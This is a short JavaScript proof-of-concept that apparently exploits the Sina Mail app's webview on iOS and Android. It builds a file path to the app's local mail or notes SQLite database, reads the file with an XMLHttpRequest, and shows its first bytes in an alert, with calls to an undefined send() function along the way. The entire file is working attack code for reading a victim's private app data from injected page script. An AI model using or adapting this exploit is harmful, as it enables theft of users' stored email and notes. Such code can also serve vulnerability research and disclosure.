var mailContentPath = location.href;
var appType = navigator.platform[0];
if (appType == 'i') {
    var mailContentFile = mailContentPath + 'SinaMail.sqlite';	// IOS file:///var/mobile/Containers/Data/Application/689ED83C-24B0-4CC0-88DE-92E7BFD870FC/Documents/
} else {
    var mailContentFile = mailContentPath + '../../databases/notes-db';	// Android	file:///data/data/com.sina.mail.free/files/webbase/

}
send(mailContentFile);
var xhr = new XMLHttpRequest();
xhr.open('GET', mailContentFile, true);
xhr.responseType = 'arraybuffer';
xhr.onload = function (e) {
    send(xhr.readyState);
    send(xhr.status);
    var uInt8Array = new Uint8Array(this.response);
    var convertList = [];
    var result = '';
    Object.keys(uInt8Array).forEach(function (key) {
        convertList.push(uInt8Array[key]);
    });
    var endTag = 18;
    for (var i = 0; i < endTag; i++) {
        result += String.fromCharCode(convertList[i]);
    }
    alert(result);
};
xhr.send();